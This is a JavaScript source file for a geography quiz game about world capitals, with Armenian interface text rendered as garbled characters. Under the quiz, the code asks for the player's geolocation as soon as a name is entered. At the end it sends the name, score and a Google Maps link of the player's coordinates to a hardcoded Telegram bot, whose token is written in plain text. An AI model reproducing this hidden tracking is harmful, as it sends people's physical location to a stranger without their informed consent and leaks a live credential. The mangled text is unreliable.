const botToken = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const chatId = '8071841674';

const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const userNameDiv = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const gameArea = document.getElementById('game-area');
const questionElement = document.getElementById('question');
const answerButtonsElement = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

let userName = '';
let currentQuestionIndex = 0;
let score = 0;
let wrong = 0;
let questions = [];
let locationLink = 'ีีฅีฒีฅีฏีกีฟีพีธึีฉีตีธึีถ ีนีซ ีฝีฟีกึีพีฅีฌ';

nameForm.addEventListener('submit', (e) => {
  e.preventDefault();
  userName = nameInput.value.trim() || 'ิฑีถีฐีกีตีฟ';
  userNameDiv.textContent = userName;
  document.getElementById('name-form-container').style.display = 'none';
  gameArea.style.display = 'block';
  getLocation();
  startGame();
});

function startGame() {
  currentQuestionIndex = 0;
  score = 0;
  wrong = 0;
  questions = getRandomQuestions(10);
  showQuestion();
}

function getRandomQuestions(count) {
  const shuffled = allQuestions.sort(() => 0.5 - Math.random());
  return shuffled.slice(0, count);
}

function showQuestion() {
  resetState();
  const question = questions[currentQuestionIndex];
  questionElement.textContent = question.question;

  const shuffledAnswers = question.answers.sort(() => 0.5 - Math.random());
  shuffledAnswers.forEach(answer => {
    const button = document.createElement('button');
    button.textContent = answer;
    button.addEventListener('click', () => selectAnswer(button, question.correct));
    answerButtonsElement.appendChild(button);
  });

  updateScoreBar();
}

function resetState() {
  answerButtonsElement.innerHTML = '';
}

function selectAnswer(button, correctAnswer) {
  const buttons = Array.from(answerButtonsElement.children);
  buttons.forEach(btn => {
    if (btn.textContent === correctAnswer) btn.classList.add('correct');
    if (btn !== button && btn.textContent !== correctAnswer) btn.disabled = true;
  });

  if (button.textContent === correctAnswer) {
    button.classList.add('correct');
    score++;
  } else {
    button.classList.add('wrong');
    wrong++;
  }

  currentQuestionIndex++;
  setTimeout(() => {
    if (currentQuestionIndex < questions.length) {
      showQuestion();
    } else {
      endGame();
    }
  }, 1500);
}

function updateScoreBar() {
  scoreInfo.textContent = `ีีกึึีฅึี ${currentQuestionIndex + 1}/${questions.length} | ีีซีทีฟี ${score} | ีีญีกีฌี ${wrong}`;
}

function endGame() {
  sendTelegramData();
  tryAgainBtn.style.display = 'block';
  tryAgainBtn.onclick = () => {
    tryAgainBtn.style.display = 'none';
    nameForm.reset();
    document.getElementById('name-form-container').style.display = 'block';
    gameArea.style.display = 'none';
  };
}

function sendTelegramData() {
  const msg = `๐ค ิฑีถีธึีถ: ${userName}%0Aโ ีีซีทีฟ ีบีกีฟีกีฝีญีกีถีถีฅึ: ${score}%0Aโ ีีญีกีฌ ีบีกีฟีกีฝีญีกีถีถีฅึ: ${wrong}%0A๐ ีีฅีฒีกีคึีธึีฉีตีธึีถ: ${locationLink}`;
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}`);
}

function getLocation() {
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(pos => {
      const { latitude, longitude } = pos.coords;
      locationLink = `https://maps.google.com/?q=${latitude},${longitude}`;
    }, () => {
      locationLink = 'ีีฐีกีปีธีฒีพีฅึ ีฝีฟีกีถีกีฌ ีฟีฅีฒีกีคึีธึีฉีตีธึีถีจ';
    });
  }
}

// --- 5 ีฐีกึึีซ ึึีซีถีกีฏีถีฅึ (ีฏีกึีธีฒ ีฅีฝ ีกีพีฅีฌีกึีถีฅีฌ ึีธีถีจ)
const allQuestions = [
  { question: "ีีึีถ ีง ีึีกีถีฝีซีกีตีซ ีดีกีตึีกึีกีฒีกึีจึ", answers: ["ีีกึีซีฆ", "ีีกึีฝีฅีฌ", "ิผีซีธีถ", "ีีซึึีก"], correct: "ีีกึีซีฆ" },
  { question: "ีีึีถ ีง ีีธึีฝีกีฝีฟีกีถีซ ีดีกีตึีกึีกีฒีกึีจึ", answers: ["ีีธีฝีฏีพีก", "ีีกีถีฏีฟ ีีฅีฟีฅึีขีธึึีฃ", "ิฟีกีฆีกีถ", "ีีธีพีธีฝีซีขีซึีฝีฏ"], correct: "ีีธีฝีฏีพีก" },
  { question: "ีีึีถ ีง ิณีฅึีดีกีถีซีกีตีซ ีดีกีตึีกึีกีฒีกึีจึ", answers: ["ิฒีฅีผีฌีซีถ", "ีีตีธึีถีญีฅีถ", "ีีกีดีขีธึึีฃ", "ีีตีธีฌีถ"], correct: "ิฒีฅีผีฌีซีถ" },
  { question: "ีีึีถ ีง ิปีฟีกีฌีซีกีตีซ ีดีกีตึีกึีกีฒีกึีจึ", answers: ["ีีผีธีด", "ีีซีฌีกีถ", "ีีฅีกีบีธีฌ", "ีีฅีถีฅีฟีซีฏ"], correct: "ีีผีธีด" },
  { question: "ีีึีถ ีง ีีกีตีกีฝีฟีกีถีซ ีดีกีตึีกึีกีฒีกึีจึ", answers: ["ิตึึีกีถ", "ิณีตีธึีดึีซ", "ีีกีถีกีฑีธึ", "ิฑีทีฟีกึีกีฏ"], correct: "ิตึึีกีถ" }
];